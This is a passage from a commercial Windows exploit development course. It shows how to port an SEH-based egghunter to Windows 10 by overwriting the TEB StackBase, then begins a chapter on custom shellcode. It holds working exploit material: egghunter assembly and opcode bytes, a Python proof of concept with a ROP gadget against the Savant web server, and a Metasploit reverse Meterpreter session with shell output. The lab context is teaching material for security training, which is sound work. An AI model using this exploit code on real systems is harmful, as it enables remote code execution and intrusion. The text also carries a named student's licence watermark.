particular code block in order to successfully call our custom _except_handler function. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
221 
 
Figure 66: Various comparisons followed by a call to RtlIsValidHandle 
According to the branches in Figure 66, there are several checks that we need to pass before we 
can reach the call to RtlIsValidHandle. The registers used in those comparisons seem to match 
the registers that contained the StackLimit and StackBase. Unfortunately, the only way to 
guarantee that they have not been altered is to go through through every single code block. 
Going through each code block side-by-side in IDA and WinDbg could be tedious and time-
consuming. To speed this up, we will set a breakpoint at the first comparison (ntdll + 0x46B45). If 
we hit that breakpoint, we can assume that our issue is not found in the preceding code blocks. 
While making assumptions such as this is generally safe, there can be cases 
where previous saved values at various memory addresses or in different 
function calls can impact execution later on. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
222 
0:002> bp ntdll + 46B45 
 
0:002> bl 
     0 d Enable Clear  77c86a10     0001 (0001)  0:**** ntdll!RtlDispatchException 
     1 e Disable Clear  77c86ad1     0001 (0001)  0:**** 
ntdll!RtlDispatchException+0xc1 
     2 e Disable Clear  77c86b45     0001 (0001)  0:**** 
ntdll!RtlDispatchException+0x135 
 
0:002> g 
Breakpoint 2 hit 
eax=00000000 ebx=03e50000 ecx=03e4ea2c edx=03e4e5dc esi=03e4e5c0 edi=03e4c000 
eip=77c86b45 esp=03e4e518 ebp=03e4e5a8 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
ntdll!RtlDispatchException+0x135: 
77c86b45 3bcf            cmp     ecx,edi 
Listing 257 - Hitting the breakpoint at the comparisons before RtlIsValidHandle 
It appears that we have successfully hit our breakpoint! This puts us right at the beginning of a 
chain of checks. If we successfully pass all of them, we will reach the call to RtlIsValidHandle 
(Figure 66). 
Let’s tackle these checks one at a time with the help of WinDbg. We’ll start by inspecting the first 
comparison, which is where our breakpoint was set. 
0:002> r 
eax=00000000 ebx=03e50000 ecx=03e4ea2c edx=03e4e5dc esi=03e4e5c0 edi=03e4c000 
eip=77c86b45 esp=03e4e518 ebp=03e4e5a8 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
ntdll!RtlDispatchException+0x135: 
77c86b45 3bcf            cmp     ecx,edi 
 
0:002> !teb 
TEB at 003e1000 
    ExceptionList:        03e4ea2c 
    StackBase:            03e50000 
    StackLimit:           03e4c000 
    SubSystemTib:         00000000 
... 
 
0:002> r @ecx; r @edi 
ecx=03e4ea2c 
edi=03e4c000 
Listing 258 - Comparing the _EXCEPTION_REGISTRATION_RECORD address to the StackLimit 
In 
the 
first 
CMP 
instruction, 
the 
code 
is 
trying 
to 
determine 
if 
the 
_EXCEPTION_REGISTRATION_RECORD structure is located at an address that is higher than the 
StackLimit. In a normal implementation, these are stored towards the beginning of the stack 
space, so this check is expected. 
Because our egghunter code pushed the custom _EXCEPTION_REGISTRATION_RECORD 
structure onto the stack and then overwrote the ExceptionList with the value of the ESP register, 
we successfully pass this check and can safely move on to the next one. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
223 
The next code block starts with an LEA instruction, which computes the effective address of the 
second operand ([ECX-0x08]) into the first operand (EAX). The result of this operation stores the 
address of our _EXCEPTION_REGISTRATION_RECORD structure plus 0x08 into EAX. 
eax=00000000 ebx=03e50000 ecx=03e4ea2c edx=03e4e5dc esi=03e4e5c0 edi=03e4c000 
eip=77c86b4d esp=03e4e518 ebp=03e4e5a8 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
ntdll!RtlDispatchException+0x13d: 
77c86b4d 8d4108          lea     eax,[ecx+8] 
 
0:002> r eax 
eax=00000000 
 
0:002> ? ecx + 8 
Evaluate expression: 65333812 = 03e4ea34 
 
0:002> t 
eax=03e4ea34 ebx=03e50000 ecx=03e4ea2c edx=03e4e5dc esi=03e4e5c0 edi=03e4c000 
eip=77c86b50 esp=03e4e518 ebp=03e4e5a8 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
ntdll!RtlDispatchException+0x140: 
77c86b50 3bc3            cmp     eax,ebx 
 
0:002> r eax 
eax=03e4ea34 
Listing 259 - Loading the effective address of the _EXCEPTION_REGISTRATION_RECORD structure plus 0x08 
The operation from Listing 259 is followed by a comparison between EAX and EBX. EAX holds our 
previously calculated value and EBX holds the StackBase: 
0:002> r 
eax=03e4ea34 ebx=03e50000 ecx=03e4ea2c edx=03e4e5dc esi=03e4e5c0 edi=03e4c000 
eip=77c86b50 esp=03e4e518 ebp=03e4e5a8 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
ntdll!RtlDispatchException+0x140: 
77c86b50 3bc3            cmp     eax,ebx 
 
0:002> !teb 
TEB at 003e1000 
    ExceptionList:        03e4ea2c 
    StackBase:            03e50000 
    StackLimit:           03e4c000 
    SubSystemTib:         00000000 
... 
 
0:002> r @eax; r @ebx 
eax=03e4ea34 
ebx=03e50000 
Listing 260 - Comparing the _EXCEPTION_REGISTRATION_RECORD address plus 0x08 to the StackBase 
Similar to our previous check, the comparison from Listing 260 checks if the memory address of 
our custom _EXCEPTION_REGISTRATION_RECORD structure plus 0x08 is located at a lower 
address 
than 
the 
StackBase. 
The 
reason 
it 
adds 
0x08 
bytes 
from 
the 
_EXCEPTION_REGISTRATION_RECORD structure is due to its size, which contains two DWORD-
sized members. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
224 
We pass this check successfully since we pushed the _EXCEPTION_REGISTRATION_RECORD 
structure on the stack. 
The next instruction is a TEST between the first byte of ECX (which holds a memory pointer to our 
custom _EXCEPTION_REGISTRATION_RECORD structure), and the hardcoded value of 0x03. This 
instruction is to confirm that the memory address of the _EXCEPTION_REGISTRATION_RECORD 
structure is aligned to the four bytes boundary.194 
0:002> r 
eax=03e4ea34 ebx=03e50000 ecx=03e4ea2c edx=03e4e5dc esi=03e4e5c0 edi=03e4c000 
eip=77c86b58 esp=03e4e518 ebp=03e4e5a8 iopl=0         nv up ei ng nz na po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000283 
ntdll!RtlDispatchException+0x148: 
77c86b58 f6c103          test    cl,3 
 
0:002> !teb 
TEB at 003e1000 
    ExceptionList:        03e4ea2c 
    StackBase:            03e50000 
    StackLimit:           03e4c000 
    SubSystemTib:         00000000 
... 
 
0:002> ? cl & 0x03 
Evaluate expression: 0 = 00000000 
Listing 261 - Verifying that the _EXCEPTION_REGISTRATION_RECORD address is aligned to the four bytes boundary 
By default, the operating system and compilers ensure that the stack, as well as other classes 
and structure members, are aligned accordingly. Given that we have not performed any arithmetic 
operations on ESP, we have maintained the alignment and therefore pass this check as well. 
This brings us to our final check. 
0:002> t 
eax=03e4ea34 ebx=03e50000 ecx=03e4ea2c edx=03e4e5dc esi=03e4e5c0 edi=03e4c000 
eip=77c86b61 esp=03e4e518 ebp=03e4e5a8 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
ntdll!RtlDispatchException+0x151: 
77c86b61 8b4904          mov     ecx,dword ptr [ecx+4] ds:0023:03e4ea30=03e4eacd 
 
0:002> dt _EXCEPTION_REGISTRATION_RECORD @ecx 
ntdll!_EXCEPTION_REGISTRATION_RECORD 
   +0x000 Next             : 0xffffffff _EXCEPTION_REGISTRATION_RECORD 
   +0x004 Handler          : 0x03e4eacd     _EXCEPTION_DISPOSITION  +3e4eacd 
 
0:002> t 
eax=03e4ea34 ebx=03e50000 ecx=03e4eacd edx=03e4e5dc esi=03e4e5c0 edi=03e4c000 
eip=77c86b64 esp=03e4e518 ebp=03e4e5a8 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
ntdll!RtlDispatchException+0x154: 
77c86b64 3bcb            cmp     ecx,ebx 
 
 
194 (Microsoft - Alignment), https://docs.microsoft.com/en-us/cpp/cpp/alignment-cpp-declarations?view=msvc-160 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
225 
0:002> !teb 
TEB at 003e1000 
    ExceptionList:        03e4ea2c 
    StackBase:            03e50000 
    StackLimit:           03e4c000 
    SubSystemTib:         00000000 
... 
 
0:002> r @ecx; r @ebx 
ecx=03e4eacd 
ebx=03e50000 
Listing 262 - Verifying that the _except_handler function address is higher than the StackBase 
The instructions from Listing 262 get the address of our _except_handler function and check if it 
is located at a higher memory address than the StackBase. This check is implemented because 
the stack is only supposed to contain data. Functions can read or write to it but the stack is not 
supposed to contain executable code. 
Because the _except_handler function is implemented in the egghunter located on the stack, we 
won’t pass this check and will not reach the call to RtlIsValidHandle. 
To summarize, to reach the RtlIsValidHandle call, we have to pass the following checks: 
1. 
The memory address of our _EXCEPTION_REGISTRATION_RECORD structure needs to be 
higher than the StackLimit. 
2. 
The memory address of our _EXCEPTION_REGISTRATION_RECORD structure plus 0x08 
needs to be lower than the StackBase. 
3. 
The memory address of our _EXCEPTION_REGISTRATION_RECORD structure needs to be 
aligned to the four bytes boundary. 
4. 
The memory address of our _except_handler function needs to be located at a higher 
address than the StackBase. 
In addition to these four checks, if SafeSEH is enabled, every _except_handler function address is 
going to be validated by the RtlIsValidHandle. Let’s quickly check the protections present on our 
binary by using !nmod from the narly extension. 
0:002> !nmod 
00400000 00452000 Savant               /SafeSEH OFF                
C:\Savant\Savant.exe 
5a710000 5a79e000 COMCTL32             /SafeSEH ON  /GS *ASLR *DEP 
C:\Windows\WinSxS\x86_microsoft.windows.common-
controls_6595b64144ccf1df_5.82.16299.15_none_2c294b7f17b4b002\COMCTL32.dll 
66da0000 66fb1000 comctl32_66da0000    /SafeSEH ON  /GS *ASLR *DEP 
C:\Windows\WinSxS\x86_microsoft.windows.common-
controls_6595b64144ccf1df_6.0.16299.15_none_1440321736920223\comctl32.DLL 
... 
Listing 263 - Verifying the protections of our vulnerable software using narly 
Fortunately for us, our binary does not come compiled with any protections. 
If we can modify our egghunter to pass the fourth check, the operating system should eventually 
call into RtlpExecuteHandlerForException and then execute our _except_handler function. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
226 
To bypass the check, we can attempt to overwrite the StackBase in the TEB with an appropriately 
crafted value. It would have to be lower than the address of our _except_handler function, but 
higher than the address of our _EXCEPTION_REGISTRATION_RECORD structure. 
Our egghunter already gathers the address of the _except_handler function dynamically, so we 
could subtract a small number of bytes195 from it and use that to overwrite the StackBase. 
Let’s inspect our updated egghunter code. 
... 
"   build_exception_record:                  " 
        # pop the address of the exception_handler  
        # into ecx 
"       pop ecx                             ;"  
        # mov signature into eax 
"       mov eax, 0x74303077                 ;"  
        # push Handler of the  
        # _EXCEPTION_REGISTRATION_RECORD structure 
"       push ecx                            ;"  
        # push Next of the  
        # _EXCEPTION_REGISTRATION_RECORD structure 
"       push 0xffffffff                     ;"  
        # null out ebx 
"       xor ebx, ebx                        ;"  
        # overwrite ExceptionList in the TEB with a pointer  
        # to our new _EXCEPTION_REGISTRATION_RECORD structure 
"       mov dword ptr fs:[ebx], esp         ;"  
        # subtract 0x04 from the pointer  
        # to exception_handler 
"       sub ecx, 0x04                       ;"  
        # add 0x04 to ebx 
"       add ebx, 0x04                       ;"  
        # overwrite the StackBase in the TEB 
"       mov dword ptr fs:[ebx], ecx         ;"  
... 
Listing 264 - egghunter_seh_win10.py: Modified version of the SEH based egghunter for Windows 10 
Our new egghunter adds some additional instructions to the build_exception_record function. 
After it overwrites the ExceptionList from the TEB, we subtract 0x04 from ECX, which still holds 
the address of our _except_handler function. The next instruction increases the value of EBX by 
0x04 and uses that as an offset into the FS register to overwrite the StackBase. 
With our updated assembly instructions, we can generate the opcodes and test if our modified 
egghunter will work with the help of WinDbg. 
6.7.2.1 Exercises 
1. 
Download the IDB file provided on your Windows 10 client under 
C:\Installers\egghunter\ntdll.idb and open it on your Kali machine using IDA. 
 
195 Notice the use of the small value 0x4. This allows us to still satisfy the requirements imposed by check number 1 and 2. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
227 
2. 
Use the pre-set bookmarks to navigate to the important code blocks. Once there, use 
WinDbg to reach those code blocks and single-step through the checks implemented to 
reach the call to RtlIsValidHandle. 
3. 
Get familiar with the checks and make sure you understand the additional instructions 
implemented in the egghunter to pass all the checks. 
6.7.3 Porting the SEH Egghunter to Windows 10 
Our goal is to see if our modifications will resolve the issue we had. We’ll need to use WinDbg to 
go through the code and determine if the exception will get handled correctly. 
Let’s update our proof of concept with the modified egghunter. 
... 
try: 
  server = sys.argv[1] 
  port = 80 
  size = 253 
 
  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; 
je 0x17  
 
  egghunter = (b"\x90\x90\x90\x90\x90\x90\x90\x90"      # NOP sled 
               b"\xeb\x2a\x59\xb8\x77\x30\x30\x74" 
               b"\x51\x6a\xff\x31\xdb\x64\x89\x23" 
               b"\x83\xe9\x04\x83\xc3\x04\x64\x89" 
               b"\x0b\x6a\x02\x59\x89\xdf\xf3\xaf" 
               b"\x75\x07\xff\xe7\x66\x81\xcb\xff" 
               b"\x0f\x43\xeb\xed\xe8\xd1\xff\xff" 
               b"\xff\x6a\x0c\x59\x8b\x04\x0c\xb1" 
               b"\xb8\x83\x04\x08\x06\x58\x83\xc4" 
               b"\x10\x50\x31\xc0\xc3") 
 
  inputBuffer = b"\x41" * (size - len(egghunter)) 
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret 
... 
Listing 265 - egghunter_0x11.py: Updating our egghunter to include the StackBase overwrite 
After attaching WinDbg to the vulnerable software, we’ll set a breakpoint at the POP EAX; RET 
instruction sequence, let the execution flow continue, and run our proof of concept. 
Once our breakpoint is hit, we can single step until we reach the end of our build_exception_record 
function. Now we can inspect the ExceptionList and the StackBase to determine if our assembly 
instructions worked as expected. 
0:003> t 
eax=74303077 ebx=00000004 ecx=03e5ead2 edx=77cd1670 esi=018d5760 edi=0041703c 
eip=03e5eabe esp=03e5ea2c ebp=41414141 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
03e5eabe 6a02            push    2 
 
0:003> !teb 
TEB at 00234000 
    ExceptionList:        03e5ea2c 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
228 
    StackBase:            03e5ead2 
    StackLimit:           03e5c000 
    SubSystemTib:         00000000 
... 
 
0:003> dt _EXCEPTION_REGISTRATION_RECORD 03e5ea2c 
ntdll!_EXCEPTION_REGISTRATION_RECORD 
   +0x000 Next             : 0xffffffff _EXCEPTION_REGISTRATION_RECORD 
   +0x004 Handler          : 0x03e5ead6     _EXCEPTION_DISPOSITION  +3e5ead6 
Listing 266 - Verifying that we pass all the checks 
Excellent! We have successfully managed to overwrite the StackBase with a value that is lower 
than the memory address of our _except_handler function, but higher than the memory address of 
our _EXCEPTION_REGISTRATION_RECORD structure. 
Letting the debugger continue execution will trigger the access violation. Rather than setting a 
breakpoint at RtlDispatchException and going through all the comparisons manually, let’s set a 
breakpoint at the _except_handler function to determine if overwriting the StackBase was enough. 
0:003> g 
(ce0.12f4): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=74303077 ebx=00000004 ecx=00000002 edx=77cd1670 esi=018d5760 edi=00000004 
eip=03e5eac3 esp=03e5ea2c ebp=41414141 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202 
03e5eac3 f3af            repe scas dword ptr es:[edi] 
 
0:003> !exchain 
03e5ea2c: 03e5ead6 
Invalid exception stack at ffffffff 
 
0:003> bp 03e5ead6 
 
0:003> g 
Breakpoint 1 hit 
eax=00000000 ebx=00000000 ecx=03e5ead6 edx=77ce3b20 esi=00000000 edi=00000000 
eip=03e5ead6 esp=03e5e4b8 ebp=03e5e4d8 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
03e5ead6 6a0c            push    0Ch 
 
0:003> u @eip 
03e5ead6 6a0c            push    0Ch 
03e5ead8 59              pop     ecx 
03e5ead9 8b040c          mov     eax,dword ptr [esp+ecx] 
03e5eadc b1b8            mov     cl,0B8h 
03e5eade 83040806        add     dword ptr [eax+ecx],6 
03e5eae2 58              pop     eax 
03e5eae3 83c410          add     esp,10h 
03e5eae6 50              push    eax 
Listing 267 - Reaching our exploit_handler_ function 
The output from Listing 267 shows that we managed to successfully reach our _except_handler 
function. Now we move on to double-check our theory behind gracefully restoring the execution 
and handling the exception. We do this with the help of WinDbg. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
229 
Our code begins by storing the value 0x0C in the ECX register. It uses that as an offset when 
dereferencing ESP to fetch the third argument into EAX, which contains the pointer to the 
CONTEXT structure. 
0:003> t 
eax=00000000 ebx=00000000 ecx=0000000c edx=77ce3b20 esi=00000000 edi=00000000 
eip=03e5ead9 esp=03e5e4b8 ebp=03e5e4d8 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
03e5ead9 8b040c          mov     eax,dword ptr [esp+ecx] ss:0023:03e5e4c4=03e5e5dc 
 
0:003> t 
... 
 
0:003> dt _CONTEXT @eax 
ntdll!_CONTEXT 
   +0x000 ContextFlags     : 0x1007f 
... 
   +0x0a0 Esi              : 0x18d5760 
   +0x0a4 Ebx              : 4 
   +0x0a8 Edx              : 0x77cd1670 
   +0x0ac Ecx              : 2 
   +0x0b0 Eax              : 0x74303077 
   +0x0b4 Ebp              : 0x41414141 
   +0x0b8 Eip              : 0x3e5eac3 
... 
 
0:003> u 0x3e5eac3 
03e5eac3 f3af            repe scas dword ptr es:[edi] 
03e5eac5 7507            jne     03e5eace 
03e5eac7 ffe7            jmp     edi 
03e5eac9 6681cbff0f      or      bx,0FFFh 
03e5eace 43              inc     ebx 
03e5eacf ebed            jmp     03e5eabe 
03e5ead1 e8d1ffffff      call    03e5eaa7 
03e5ead6 6a0c            push    0Ch 
 
0:003> ? 03e5eac9 - 03e5eac3  
Evaluate expression: 6 = 00000006 
Listing 268 - Dumping the CONTEXT structure and inspecting the Eip member 
Reviewing the output from Listing 268, the Eip member of the CONTEXT structure points to the 
instruction that caused the access violation (REPE SCASD). 
Ideally, when restoring the execution flow, we would like the instruction pointer to point to the 
beginning of the loop_inc_page function, which is 0x06 bytes further. We’ll do that with the next 
instruction. 
0:003> r 
eax=03e5e5dc ebx=00000000 ecx=000000b8 edx=77ce3b20 esi=00000000 edi=00000000 
eip=03e5eade esp=03e5e4b8 ebp=03e5e4d8 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
03e5eade 83040806        add     dword ptr [eax+ecx],6 ds:0023:03e5e694=03e5eac3 
 
0:003> t 
... 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
230 
 
0:003> dt _CONTEXT @eax 
ntdll!_CONTEXT 
   +0x000 ContextFlags     : 0x1007f 
... 
   +0x09c Edi              : 4 
   +0x0a0 Esi              : 0x18d5760 
   +0x0a4 Ebx              : 4 
   +0x0a8 Edx              : 0x77cd1670 
   +0x0ac Ecx              : 2 
   +0x0b0 Eax              : 0x74303077 
   +0x0b4 Ebp              : 0x41414141 
   +0x0b8 Eip              : 0x3e5eac9 
... 
 
0:003> u 0x3e5eac9 Le 
03e5eac9 6681cbff0f      or      bx,0FFFh 
03e5eace 43              inc     ebx 
03e5eacf ebed            jmp     03e5eabe 
03e5ead1 e8d1ffffff      call    03e5eaa7 
03e5ead6 6a0c            push    0Ch 
03e5ead8 59              pop     ecx 
03e5ead9 8b040c          mov     eax,dword ptr [esp+ecx] 
03e5eadc b1b8            mov     cl,0B8h 
03e5eade 83040806        add     dword ptr [eax+ecx],6 
03e5eae2 58              pop     eax 
03e5eae3 83c410          add     esp,10h 
03e5eae6 50              push    eax 
03e5eae7 31c0            xor     eax,eax 
03e5eae9 c3              ret 
Listing 269 - Overwriting the Eip member to make it point to our loop_inc_page_ function 
As a final step, our egghunter will POP the return address into EAX and then increase ESP by 0x10 
bytes to clean up the stack. We then push the return address back onto the stack and zero out 
EAX to simulate the ExceptionContinueExecution return value. 
At this point, we can remove any breakpoints and let the execution flow resume while waiting for 
our shell. Unfortunately, every time we hit an unmapped memory page or one we don’t have 
access to, we get an access violation, which halts the debugger. 
Fortunately for us, these can be temporarily disabled in WinDbg. To avoid stopping the execution 
for every “first time” exception, we’ll use the sxd196 command to disable them. This will also 
disable guard pages.197 
0:003> sxd av 
 
0:003> sxd gp 
 
0:003> bc * 
 
0:003> g 
 
196 (WinDBG - Exceptions, events, and crash analysis), http://windbg.info/doc/1-common-cmds.html#9_exceptions 
197 (Microsoft - Creating Guard Pages), https://docs.microsoft.com/en-us/windows/win32/memory/creating-guard-pages 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
231 
Listing 270 - Disabling the ability to catch access violations and guard page in WinDbg 
Before letting the execution continue in WinDbg, let’s remember to set up a listener. The moment 
our egghunter finds our egg, it will jump to it and execute our payload. This will give us a reverse 
Meterpreter session on the target. 
msf5 exploit(multi/handler) > exploit 
 
[*] Started reverse TCP handler on 192.168.119.120:443  
[*] Sending stage (180291 bytes) to 192.168.120.10 
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.10:49675)  
 
meterpreter > shell 
Process 1796 created. 
Channel 1 created. 
Microsoft Windows [Version 10.0.16299.15] 
(c) 2017 Microsoft Corporation. All rights reserved. 
 
C:\Savant> ipconfig 
ipconfig 
 
Windows IP Configuration 
 
 
Ethernet adapter Ethernet0: 
 
   Connection-specific DNS Suffix  . :  
   IPv4 Address. . . . . . . . . . . : 192.168.120.10 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0 
   Default Gateway . . . . . . . . . : 192.168.120.254 
 
C:\Savant> 
Listing 271 - Getting a reverse meterpreter on the target machine using the SEH egghunter 
This confirms that our changes to the egghunter have made it functional on Windows 10. Given 
that the SEH mechanism has not drastically changed, our egghunter maintains functionality on 
older Windows versions such as 7 or 8. 
Often in exploit development, methods that are known to be portable will break with time and 
updates to the operating system. Having a very good understanding of how the technique works 
gives us the opportunity to slightly modify the code and possibly restore its functionality. 
6.7.3.1 Exercises 
1. 
Generate the opcodes for the updated egghunter and update your previous proof of concept 
to include them. 
2. 
Run the proof of concept and ensure that you can break at the custom _except_handler 
function. Once there, single-step through the instructions and verify that the Eip member of 
the CONTEXT structure is overwritten correctly. 
3. 
Remove all the breakpoints, disable access violations and guard pages in WinDbg, and let 
the execution continue. Did you get a shell on the machine? 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
232 
6.7.3.2 Extra Mile 
1. 
Run the application under C:\Installers\egghunter\extra_mile\. 
2. 
After attaching a debugger to the application, run the provided proof of concept and confirm 
that a buffer overflow occurs. 
3. 
Write a fully working exploit for the application using both a system call-based egghunter as 
well as an SEH-based one. 
6.8 Wrapping Up 
This module covered the exploit development process in an environment that has various 
restrictions including space limitations and a partial overwrite as well as various bad characters. 
We also covered the inner workings of the egghunter technique as well as various 
implementations. We were able to adapt both the system call-based egghunter as well as the 
SEH one to run on Windows 10. 
In addition, we reviewed a more portable implementation of the egghunter that uses the 
structured exception handler mechanism. Using our knowledge from previous modules along 
with static and dynamic code analysis, we were able to troubleshoot and port the SEH-based 
egghunter to Windows 10. This resulted in a more portable egghunter and exploit. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
233 
 
7 Creating Custom Shellcode 
In previous modules, we generated various payloads using the Metasploit Framework and used 
them in our exploits. In this module, we will learn more about how shellcode works and develop 
our own reverse shell. 
A Shellcode198 is a set of CPU instructions meant to be executed after a vulnerability is 
successfully exploited. The term “shellcode” originally referred to the portion of an exploit used to 
spawn a root shell. While reverse shells are common, it’s important to understand that we can 
use shellcode in much more complex ways. 
Because shellcode is generally written in the assembly language first, and then translated into the 
corresponding hexadecimal opcodes, it can be used to directly manipulate CPU registers, and call 
system functions. 
Writing universal and reliable shellcode, particularly for the Windows platform, can be challenging 
and requires some low-level knowledge of the operating system. For this reason, it is often 
shrouded in mystery. 
Before we get into the shellcode creation, let’s quickly review the Windows calling conventions 
and system calls that are fundamental to shellcode writing. 
7.1 Calling Conventions on x86 
As we learned in previous modules, calling conventions199 describe the schema used to invoke 
function calls. Specifically, they define: 
• 
How arguments are passed to a function. 
• 
Which registers the callee must preserve for the caller. 
• 
How the stack frame needs to be prepared before the call. 
• 
How the stack frame needs to be restored after the call. 
Therefore, it is critical for the shellcode developer to use the correct calling convention for the API 
function used in the shellcode. 
Win32 API functions use the __stdcall200 calling convention, while C runtime functions use the 
__cdecl201 calling convention. 
In both of these cases, the parameters are pushed to the stack by the caller in reverse order. 
However, when using __stdcall, the stack is cleaned up by the callee, while it is cleaned up by the 
caller when __cdecl is used. 
 
198 (Wikipedia - Shellcode), http://en.wikipedia.org/wiki/Shellcode 
199 (Wikipedia - Calling Convention), https://en.wikipedia.org/wiki/Calling_convention 
200 (Microsoft - _stdcall), https://msdn.microsoft.com/en-us/library/zxk0tw93.aspx 
201 (Microsoft - _cdecl), https://docs.microsoft.com/en-us/cpp/cpp/cdecl?view=msvc-160 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
234 
For any calling convention on a 32-bit system, the EAX, EDX, and ECX registers are considered 
volatile, which means they can be clobbered during a function call. Therefore, we should not rely 
on these registers unless we have tested and confirmed that they are not affected during the 
execution of the called API. All other registers are considered non-volatile and must be preserved 
by the callee. 
The term “clobbered” refers to the process of overwriting the value of a CPU 
register as part of a function call and not restoring it back to the original value 
before returning out of the call. 
Now that we’ve covered the basics of calling conventions found in most shellcodes, let’s learn 
more about system calls and how Windows handles them. 
7.2 The System Call Problem 
As we learned in the egghunter module, system calls (syscalls) are a set of powerful functions 
that provide an interface to the protected kernel from user space. This interface allows access to 
low-level operating system functions used for I/O, thread synchronization, socket management, 
and more. Practically speaking, syscalls allow user applications to directly access the kernel while 
ensuring they don’t compromise the OS.202 
Generally speaking, the purpose of any shellcode is to conduct arbitrary operations that are not 
part of the original application code logic. In order to do so, the shellcode uses assembly 
instructions that invoke system calls after the exploit hijacks the application’s execution flow. 
The Windows Native API203 is equivalent to the system call interface on UNIX operating systems. 
It is a mostly-undocumented application programming interface exposed to user-mode 
applications by the ntdll.dll library.204 As such, it provides a way for user-mode applications to call 
operating system functions located in the kernel in a controlled manner. 
On most UNIX operating systems, the system call interface is well-documented and generally 
available for user applications. The Native API, in contrast, is hidden behind higher-level APIs due 
to the nature of the NT architecture. 
The Native API supports a number of operating system APIs (Win32, OS/2, POSIX, DOS/Win16) 
by implementing operating environment subsystems in user-mode that export particular APIs to 
client programs.205 
Kernel-level functions are typically identified by system call numbers that are used to call the 
corresponding functions. It is important to note that on Windows, these system call numbers tend 
to change between major and minor version releases. On Linux systems however, these call 
 
202 (Wikipedia - System Calls), http://en.wikipedia.org/wiki/System_call 
203 (The Windows Native API), https://social.technet.microsoft.com/wiki/contents/articles/11831.the-windows-native-api.aspx 
204 (Wikipedia - Native API), http://en.wikipedia.org/wiki/Native_API 
205 The Win32 operating environment subsystem is divided among a server process, CSRSS.EXE (Client-Server Runtime Subsystem), 
and client-side DLLs that are linked with user applications that use the Win32 API. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
235 
numbers are fixed and do not change. We should also keep in mind that the feature set exported 
by the Windows system call interface is rather limited. For example, Windows does not export a 
socket API via the system call interface. This means we need to avoid direct system calls to write 
universal and reliable shellcode for Windows. 
Without system calls, our only option for communicating directly with the kernel is to use the 
Windows API, which is exported by dynamic-link libraries (DLLs) that are mapped into process 
memory space at runtime. If DLLs are not already loaded into the process space, we need to load 
them and locate the functions they export. Once the functions have been located, we can invoke 
